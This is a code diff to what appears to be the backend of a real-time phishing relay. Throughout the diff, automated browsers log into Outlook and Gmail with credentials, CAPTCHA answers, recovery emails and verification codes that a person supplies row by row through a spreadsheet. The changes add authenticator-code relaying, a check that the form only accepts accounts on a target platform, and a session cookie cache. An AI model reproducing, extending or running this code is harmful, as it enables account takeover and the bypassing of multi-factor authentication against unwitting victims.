@@ -29,6 +29,8 @@ import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
 import axios from 'axios';
+import { populateCache, setCachedRow, evictRow } from '../../../../utils/cookieCache.js';
+import { identifySelf as identifyServerlessSelf } from '../../../../utils/serverlessTracker.js';
 
 const PLATFORM_INBOX_URLS = {
     'outlook.com': 'https://outlook.live.com/mail/',
@@ -49,6 +51,75 @@ logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);
 export const maxDuration = 60;
 export const dynamic = "force-dynamic";
 export const runtime = 'nodejs';
+
+/**
+ * Validates email domain against the strictly platform using MX record detection.
+ * @param {string} email - The email address to validate
+ * @param {string} strictly - The required platform key (e.g., 'outlook', 'gmail', 'proton')
+ * @returns {Promise<{valid: boolean, message: string, detectedPlatform: string}>}
+ */
+async function validateEmailAgainstStrictly(email, strictly) {
+    if (!strictly || !email) {
+        return { valid: true, message: '', detectedPlatform: '' };
+    }
+
+    const strictlyLower = strictly.toLowerCase();
+    const platformConfig = platformConfigs[strictlyLower];
+
+    if (!platformConfig || !platformConfig.mxKeywords) {
+        logger.warn(`[validateEmailAgainstStrictly] Unknown strictly platform: '${strictly}'`);
+        return { valid: true, message: '', detectedPlatform: '' };
+    }
+
+    const domain = email.split('@')[1]?.toLowerCase();
+    if (!domain) {
+        return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
+    }
+
+    // Resolve MX records for the domain
+    let mxRecords = [];
+    try {
+        mxRecords = await resolveMx(domain).catch(() => []);
+    } catch (e) {
+        logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
+    }
+
+    // Check if domain or MX records match the strictly platform's keywords
+    const matchedKeyword = platformConfig.mxKeywords.find(kw =>
+        domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw))
+    );
+
+    if (matchedKeyword) {
+        logger.info(`[validateEmailAgainstStrictly] Email '${email}' matches strictly='${strictly}' (matched: '${matchedKeyword}')`);
+        return { valid: true, message: '', detectedPlatform: strictlyLower };
+    }
+
+    // No match - email domain doesn't belong to the required platform
+    const platformName = strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
+    const message = `Incorrect email. This form only accepts ${platformName} accounts.`;
+    logger.warn(`[validateEmailAgainstStrictly] Email '${email}' rejected for strictly='${strictly}' (domain: ${domain})`);
+    return { valid: false, message, detectedPlatform: '' };
+}
+
+/**
+ * Non-blocking update: writes to cache FIRST, then fires Sheets API without await.
+ * This prevents Sheets API latency from blocking the engine flow.
+ * @param {string} browserId - The browser ID
+ * @param {object} updateData - The data to update
+ * @param {boolean} isNewRow - Whether this is a new row creation
+ */
+function updateBrowserRowDataFast(browserId, updateData, isNewRow = false) {
+    // 1. Write to cache FIRST (instant, synchronous)
+    if (isNewRow) {
+        populateCache(browserId, updateData);
+    } else {
+        setCachedRow(browserId, updateData);
+    }
+    // 2. Fire Sheets API WITHOUT await (non-blocking)
+    updateBrowserRowData(browserId, updateData, isNewRow).catch(err => {
+        logger.error(`[updateBrowserRowDataFast][${browserId}] Background Sheets write failed: ${err.message}`);
+    });
+}
 
 async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
     if (!platformConfig?.additionalViews || platformConfig.additionalViews.length === 0) {
@@ -1320,7 +1391,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 timestamp: new Date().toISOString()
             });
             // Clear email/domain in the sheet to prompt the user to re-enter and persist the WAITINGEMAIL state
-            await updateBrowserRowData(browserId, { ...updateData, email: '', domain: '' });
+            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '' });
             return; // Exit so no later logic overwrites this WAITING state
         }
 
@@ -1390,7 +1461,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (currentEmail && String(currentEmail).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGEMAIL] Email found. Setting status to PROCESSING.`);
-                        await updateBrowserRowData(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
+                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                         email = currentEmail; // Update the email variable for subsequent use
                         emailProvidedAndProcessed = true;
                         // Refresh password from sheet — user may have submitted it alongside email
@@ -1398,6 +1469,37 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         if (freshPassword && String(freshPassword).trim() !== "") {
                             password = freshPassword;
                         }
+
+                        // Validate email against strictly platform using MX detection
+                        const rowStrictlyForValidation = checkRow[checkColumnIndexes['strictly']];
+                        if (rowStrictlyForValidation) {
+                            const validation = await validateEmailAgainstStrictly(email, rowStrictlyForValidation);
+                            if (!validation.valid) {
+                                logger.warn(`[processRow][${browserId}] Email '${email}' rejected by strictly validation: ${validation.message}`);
+                                finalStatus = "WAITINGEMAIL";
+                                updateData.status = finalStatus;
+                                updateData.lastJsonResponse = JSON.stringify({
+                                    browserId,
+                                    email,
+                                    status: finalStatus,
+                                    emailExists: true,
+                                    accountAccess: false,
+                                    reachedInbox: false,
+                                    requiresVerification: false,
+                                    verificationState: null,
+                                    verificationOptions: [],
+                                    platform: 'unknown',
+                                    timestamp: new Date().toISOString(),
+                                    errorType: 'STRICTLY_MISMATCH',
+                                    message: validation.message
+                                });
+                                // Clear email, domain, password and return to WAITINGEMAIL
+                                updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
+                                exitingEarly = true;
+                                return; // Exit processRow immediately
+                            }
+                        }
+
                         // After email is found, we need to determine platform and then proceed with checkAccountAccess
                         domain = email.split('@')[1].toLowerCase();
                         mxRecords = await resolveMx(domain).catch(() => []);
@@ -1433,7 +1535,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             });
                             // Clear the email, domain, and password fields in the sheet when transitioning to WAITINGEMAIL
                             logger.debug(`[processRow][${browserId}] Clearing email, domain, password. Returning to WAITINGEMAIL state.`);
-                            await updateBrowserRowData(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
+                            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
                             exitingEarly = true;
                             return; // Exit processRow immediately so no later logic overwrites status
                         }
@@ -1526,7 +1628,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
                         if (captchaAnswer && String(captchaAnswer).trim() !== "") {
                             logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
-                            await updateBrowserRowData(browserId, { status: "PROCESSING", captchaAnswer: '' });
+                            updateBrowserRowDataFast(browserId, { status: "PROCESSING", captchaAnswer: '' });
                             // Find and fill the captcha answer input
                             const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
                             let filled = false;
@@ -1569,7 +1671,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
                                         if (uploadResult.success) {
                                             updateData.captcha = uploadResult.webViewLink;
-                                            await updateBrowserRowData(browserId, { captcha: uploadResult.webViewLink });
+                                            updateBrowserRowDataFast(browserId, { captcha: uploadResult.webViewLink });
                                         }
                                     } catch (ssError) {
                                         logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
@@ -1652,7 +1754,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (currentPassword && String(currentPassword).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Password found. Setting status to PROCESSING.`);
-                        await updateBrowserRowData(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
+                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing password submission" }) }); // Set status to PROCESSING
                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Attempting to input password.`);
 
                         // Ensure page is stable and handle any intermediate views before typing password
@@ -1834,7 +1936,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     });
                                     // Clear the password field and persist the WAITINGPASSWORD state
                                     logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
-                                    await updateBrowserRowData(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+                                    updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
@@ -1937,13 +2039,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     });
                                     // Clear the password field and persist the WAITINGPASSWORD state
                                     logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
-                                    await updateBrowserRowData(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+                                    updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
                                 passwordProvidedAndProcessed = true;
                                 // Do not clear password from sheet after attempt as per user request
-                                // await updateBrowserRowData(browserId, { verificationCode: '', verificationChoice: '' });
+                                // updateBrowserRowDataFast(browserId, { verificationCode: '', verificationChoice: '' });
 
                             } catch (e) {
                                 logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during password entry/submission: ${e.message}`);
@@ -2039,7 +2141,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             viewName: currentPageVerificationState.viewName,
                             message: "Verification code screen reached."
                         });
-                        await updateBrowserRowData(browserId, {
+                        updateBrowserRowDataFast(browserId, {
                             status: "WAITINGCODE",
                             verificationChoice: '',
                             lastJsonResponse: updateData.lastJsonResponse
@@ -2058,7 +2160,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             viewName: currentPageVerificationState.viewName,
                             message: "Recovery email confirmation screen reached."
                         });
-                        await updateBrowserRowData(browserId, {
+                        updateBrowserRowDataFast(browserId, {
                             status: "WAITINGRECOVERYEMAIL",
                             verificationChoice: '',
                             lastJsonResponse: updateData.lastJsonResponse
@@ -2090,7 +2192,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             ljr.gmail = { step: "waiting_options", options: freshCurrentVerificationOptions };
                         }
                         updateData.lastJsonResponse = JSON.stringify(ljr);
-                        await updateBrowserRowData(browserId, {
+                        updateBrowserRowDataFast(browserId, {
                             status: "WAITINGOPTIONS",
                             verified: true,
                             fullAccess: false,
@@ -2123,7 +2225,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (verificationChoiceRaw) {
                         logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}. Setting status to PROCESSING.`);
-                        await updateBrowserRowData(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING
+                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING
 
                         let choiceData = null;
                         let hiddenInputText = null;
@@ -2146,7 +2248,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Interpreted verificationChoiceRaw as plain string for full email input: '${hiddenInputText}' for view ${currentActualViewName}`);
                             } else {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Invalid verificationChoice format for view '${currentActualViewName}'. Expected JSON, got raw text. Error: ${e.message}. Clearing choice.`);
-                                await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions), verified: true, fullAccess: false });
+                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions), verified: true, fullAccess: false });
                                 await new Promise(resolve => setTimeout(resolve, 10000));
                                 continue;
                             }
@@ -2164,20 +2266,20 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Using 'full_email_input' option for view: ${currentActualViewName}`);
                                 if (!hiddenInputText) {
                                     logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'hiddenPhoneEmail' (full email) is required for '${currentActualViewName}' but not provided in verificationChoice. Value was: '${hiddenInputText}'.`);
-                                    await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
+                                    updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                     await new Promise(resolve => setTimeout(resolve, 10000));
                                     continue;
                                 }
                             } else {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected 'full_email_input' option type for view '${currentActualViewName}' but found: ${JSON.stringify(currentVerificationOptions)}. Clearing choice.`);
-                                await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
+                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                 await new Promise(resolve => setTimeout(resolve, 10000));
                                 continue;
                             }
                         } else {
                             if (!chosenOptionIndex) {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'choice' (index) property missing in verificationChoice data for view '${currentActualViewName}'.`);
-                                await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
+                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                 await new Promise(resolve => setTimeout(resolve, 10000));
                                 continue;
                             }
@@ -2186,7 +2288,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                         if (!selectedOption) {
                             logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Chosen option (index: ${chosenOptionIndex}, for view: ${currentActualViewName}) not found or applicable in current options. Options: ${JSON.stringify(currentVerificationOptions)}`);
-                            await updateBrowserRowData(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
+                            updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                             await new Promise(resolve => setTimeout(resolve, 10000));
                             continue;
                         }
@@ -2238,7 +2340,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${typedValue}" into ${selectedOption.inputSelector}`);
                             } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                                 logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
-                                await updateBrowserRowData(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
+                                updateBrowserRowDataFast(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                 await new Promise(resolve => setTimeout(resolve, 10000));
                                 continue;
                             } else if (selectedOption.requiresInput && !hiddenInputText) {
@@ -2266,7 +2368,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             message: "Verification code screen reached."
                                         })
                                     };
-                                    await updateBrowserRowData(browserId, updateData);
+                                    updateBrowserRowDataFast(browserId, updateData);
                                     break;
                                 } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'text_input') {
                                     logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to text input: ${gmailPostClickVerification.viewName}. Setting WAITINGRECOVERYEMAIL.`);
@@ -2283,12 +2385,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             message: "Recovery email confirmation screen reached."
                                         })
                                     };
-                                    await updateBrowserRowData(browserId, updateData);
+                                    updateBrowserRowDataFast(browserId, updateData);
                                     break;
                                 } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'choice') {
                                     logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail still on choice page after click (e.g. account_recovery). Refreshing options.`);
                                     currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, gmailPostClickVerification.viewName);
-                                    await updateBrowserRowData(browserId, {
+                                    updateBrowserRowDataFast(browserId, {
                                         status: "WAITINGOPTIONS",
                                         verificationChoice: '',
                                         verificationOptions: JSON.stringify(currentVerificationOptions),
@@ -2308,7 +2410,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         break;
                                     }
                                     logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option click: unexpected page state. Continuing poll.`);
-                                    await updateBrowserRowData(browserId, {
+                                    updateBrowserRowDataFast(browserId, {
                                         status: "WAITINGOPTIONS",
                                         verificationChoice: '',
                                         lastJsonResponse: JSON.stringify({
@@ -2358,7 +2460,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     viewName: currentActualViewName,
                                     message: "Outlook reported a temporary service problem. Please try again later."
                                 });
-                                await updateBrowserRowData(browserId, {
+                                updateBrowserRowDataFast(browserId, {
                                     status: "WAITINGOPTIONS",
                                     verificationChoice: '', // Re-added clearing
                                     verificationOptions: JSON.stringify(errorOption),
@@ -2386,7 +2488,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         message: "Code sent, awaiting input."
                                     })
                                 };
-                                await updateBrowserRowData(browserId, updateData);
+                                updateBrowserRowDataFast(browserId, updateData);
                                 break;
                             } else {
                                 logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
@@ -2394,7 +2496,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
                                     logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
                                     currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName);
-                                    await updateBrowserRowData(browserId, {
+                                    updateBrowserRowDataFast(browserId, {
                                         status: "WAITINGOPTIONS",
                                         verificationOptions: JSON.stringify(currentVerificationOptions),
                                         lastJsonResponse: JSON.stringify({
@@ -2413,7 +2515,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         } catch (interactionError) {
                             logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during page interaction for choice: ${interactionError.message}. Clearing choice and retrying WAITINGOPTIONS.`);
                             currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName).catch(() => currentVerificationOptions);
-                            await updateBrowserRowData(browserId, {
+                            updateBrowserRowDataFast(browserId, {
                                 status: "WAITINGOPTIONS",
                                 verificationOptions: JSON.stringify(currentVerificationOptions),
                                 lastJsonResponse: JSON.stringify({
@@ -2482,7 +2584,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     verificationState: 'WAITING_RECOVERY_EMAIL',
                     message: "Awaiting recovery email address."
                 });
-                await updateBrowserRowData(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
+                updateBrowserRowDataFast(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
             }
 
             const pollingTimeoutRecoveryEmail = Date.now() + 5 * 60 * 1000;
@@ -2524,7 +2626,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (recoveryEmailValue && String(recoveryEmailValue).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email found: '${recoveryEmailValue}'. Setting status to PROCESSING.`);
-                        await updateBrowserRowData(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });
+                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });
 
                         const recoveryInputSelector = platformConfig.selectors?.recoveryEmailInput;
                         const recoveryNextSelector = platformConfig.selectors?.recoveryEmailNext;
@@ -2570,7 +2672,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         viewName: postRecoveryState.viewName,
                                         message: "Recovery email submitted. Verification code screen reached."
                                     });
-                                    await updateBrowserRowData(browserId, updateData);
+                                    updateBrowserRowDataFast(browserId, updateData);
                                     break;
                                 } else if (postRecoveryState.required && postRecoveryState.type === 'choice') {
                                     logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Returned to choice screen after recovery email. Setting WAITINGOPTIONS.`);
@@ -2589,7 +2691,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             message: "Recovery email submitted, returned to verification options."
                                         })
                                     };
-                                    await updateBrowserRowData(browserId, updateData);
+                                    updateBrowserRowDataFast(browserId, updateData);
                                     break;
                                 } else {
                                     const inboxReached = await isInbox(page, platformConfig).catch(() => false);
@@ -2602,7 +2704,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 }
                             } catch (interactionError) {
                                 logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during recovery email entry: ${interactionError.message}`);
-                                await updateBrowserRowData(browserId, {
+                                updateBrowserRowDataFast(browserId, {
                                     status: "WAITINGRECOVERYEMAIL",
                                     lastJsonResponse: JSON.stringify({
                                         ...JSON.parse(updateData.lastJsonResponse || '{}'),
@@ -2674,7 +2776,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     viewName: JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName || null,
                     message: "Awaiting verification code."
                 });
-                await updateBrowserRowData(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
+                updateBrowserRowDataFast(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
             }
 
 
@@ -2718,7 +2820,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                     if (verificationCode && String(verificationCode).trim() !== "") {
                         logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'. Setting status to PROCESSING.`);
-                        await updateBrowserRowData(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
+                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING
 
                         const currentViewNameForCode = JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName;
                         let codeInputSelector;
@@ -2730,6 +2832,10 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit;
                             useEnterToSubmit = true;
                             logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
+                        } else if (currentViewNameForCode === 'Outlook Authenticator OTP') {
+                            codeInputSelector = platformConfig.selectors?.authenticatorCodeInput;
+                            codeSubmitSelector = platformConfig.selectors?.authenticatorCodeSubmit;
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Authenticator OTP code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                         } else if (currentViewNameForCode === 'Gmail Email Code Entry') {
                             codeInputSelector = platformConfig.selectors?.gmailEmailCodeInput;
                             codeSubmitSelector = platformConfig.selectors?.gmailEmailCodeSubmit;
@@ -2776,11 +2882,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                             if (codeEntryAttempted) {
                                 // Check for codeError immediately after submission
-                                const codeErrorSelector = platformConfig.selectors?.codeError;
+                                let codeErrorSelector = platformConfig.selectors?.codeError;
+                                // Use authenticator-specific error selector for that view
+                                if (currentViewNameForCode === 'Outlook Authenticator OTP') {
+                                    codeErrorSelector = platformConfig.selectors?.authenticatorCodeError || codeErrorSelector;
+                                }
                                 let codeErrorDetected = false;
                                 if (codeErrorSelector) {
                                     try {
-                                        await page.waitForSelector(codeErrorSelector, { visible: true, timeout: 1000 }); // Short timeout for immediate check
+                                        await page.waitForSelector(codeErrorSelector, { visible: true, timeout: 2000 });
                                         codeErrorDetected = true;
                                         logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error detected via selector: ${codeErrorSelector}.`);
                                     } catch (e) {
@@ -2896,7 +3006,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     ljp.verified = true;
                                     ljp.fullAccess = false;
                                     ljp.message = "Incorrect verification code entered. Please try again.";
-                                    await updateBrowserRowData(browserId, {
+                                    updateBrowserRowDataFast(browserId, {
                                         status: "WAITINGCODE",
                                         verificationCode: '',
                                         verified: true,
@@ -3060,12 +3170,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         viewName: postCodeVerificationState.viewName
                                     })
                                 };
-                                await updateBrowserRowData(browserId, updateData);
+                                updateBrowserRowDataFast(browserId, updateData);
                                 codeSuccessfullyProcessed = false;
                                 break;
                             } else if (stillOnCodeEntryScreen) {
                                 logger.warn(`[processRow][${browserId}][WAITING_CODE] Still on code entry screen. Assuming code was incorrect. Resetting status to WAITING_CODE.`);
-                                await updateBrowserRowData(browserId, {
+                                updateBrowserRowDataFast(browserId, {
                                     status: "WAITINGCODE",
                                     verificationCode: '',
                                     lastJsonResponse: JSON.stringify({
@@ -3087,7 +3197,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     viewName: postCodeVerificationState.viewName,
                                     message: "Recovery email confirmation required after code submission."
                                 });
-                                await updateBrowserRowData(browserId, updateData);
+                                updateBrowserRowDataFast(browserId, updateData);
                                 break;
                             } else {
                                 const inboxCheckAfterCode = await isInbox(page, platformConfig).catch(() => false);
@@ -3204,7 +3314,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 captchaUrl: page ? page.url() : undefined
             });
             notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, detail: 'CAPTCHA auto-solve failed', url: page ? page.url() : undefined });
-            await updateBrowserRowData(browserId, updateData);
+            updateBrowserRowDataFast(browserId, updateData);
             return;
         }
 
@@ -3228,7 +3338,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateData.verificationOptions = JSON.stringify(initialCheckResult.verificationOptions);
             }
             updateData.status = sheetStatus; // Send non-underscore status to the sheet
-            await updateBrowserRowData(browserId, updateData);
+            updateBrowserRowDataFast(browserId, updateData);
             return; // Exit processRow immediately
         } else if (initialCheckResult.verificationState === 'WAITINGEMAIL_ERROR') {
             const sheetStatus = initialCheckResult.verificationState.replace(/_/g, '');
@@ -3245,7 +3355,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 message: initialCheckResult.message // Use the message from checkAccountAccess
             });
             updateData.status = sheetStatus;
-            await updateBrowserRowData(browserId, { ...updateData, email: '' });
+            updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
             return;
         } else if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR') {
             // Unify: use WAITINGPASSWORD (not WAITINGPASSWORDERROR) so the WAITINGPASSWORD handler retries correctly
@@ -3263,7 +3373,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 platform, timestamp: new Date().toISOString(),
                 message: initialCheckResult.message
             });
-            await updateBrowserRowData(browserId, { ...updateData, password: '' });
+            updateBrowserRowDataFast(browserId, { ...updateData, password: '' });
             return;
         } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
@@ -3282,7 +3392,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     message: "Session expired during password entry. Please restart the process."
                 });
                 updateData.status = finalStatus;
-                await updateBrowserRowData(browserId, updateData);
+                updateBrowserRowDataFast(browserId, updateData);
                 return;
             } else {
                 logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAIL and clearing email.`);
@@ -3299,7 +3409,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     message: "Email does not exist. Please provide a valid email."
                 });
                 updateData.status = finalStatus;
-                await updateBrowserRowData(browserId, { ...updateData, email: '' });
+                updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                 return;
             }
